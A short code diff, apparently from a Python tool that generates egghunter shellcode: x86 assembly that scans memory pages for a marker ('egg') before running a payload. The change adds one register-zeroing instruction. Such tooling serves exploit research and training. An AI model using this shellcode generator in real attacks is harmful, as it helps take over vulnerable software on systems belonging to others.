@@ -75,6 +75,7 @@ def build_old(tag: str, syscall_id: int, negate=False) -> bytes:    #classic gen
         mov_eax = f"push 0x{syscall_id:x}\npop eax"
 
     asm = f"""
+    xor edx, edx ;; optional if the egg is not in more lower address
 loop_inc_page:
     or dx, 0x0fff
 loop_inc_one:
